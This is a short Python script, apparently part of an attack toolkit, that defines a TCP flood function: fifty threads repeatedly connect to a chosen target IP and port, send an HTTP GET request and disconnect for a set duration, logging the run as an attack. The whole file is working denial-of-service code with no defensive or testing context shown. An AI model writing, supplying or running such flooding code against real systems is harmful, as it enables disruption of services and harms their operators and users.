import socket
import threading
import time

def run_tcp_flood(target_ip, target_port, duration=10):
    print(f"[TCP_FLOOD] Starting TCP flood on {target_ip}:{target_port} for {duration} seconds.")
    end_time = time.time() + duration

    def flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                s.close()
            except Exception as e:
                print(f"[TCP_FLOOD] Error: {e}")

    threads = [threading.Thread(target=flood) for _ in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("[TCP_FLOOD] Attack finished.")
